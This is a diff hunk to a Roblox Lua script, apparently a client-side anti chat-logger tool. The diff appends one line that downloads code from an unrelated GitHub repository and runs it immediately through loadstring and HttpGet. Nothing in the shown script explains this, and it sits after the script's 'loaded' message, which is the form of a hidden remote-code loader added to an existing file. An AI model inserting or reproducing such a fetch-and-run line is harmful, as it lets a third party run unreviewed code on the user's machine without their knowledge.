@@ -484,3 +484,4 @@ setreadonly(Metatable, true)
 
 Notify(NotificationTitle, "Anti Chat & Screenshot Logger Loaded!", 15)
 print(string.format("AnthonyIsntHere's Anti Chat-Logger has loaded in %s seconds.", string.format("%.2f", tostring(tick() - ACL_LoadTime))))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UnNamedRBScripts/Play-Button-Sound/main/play"))()
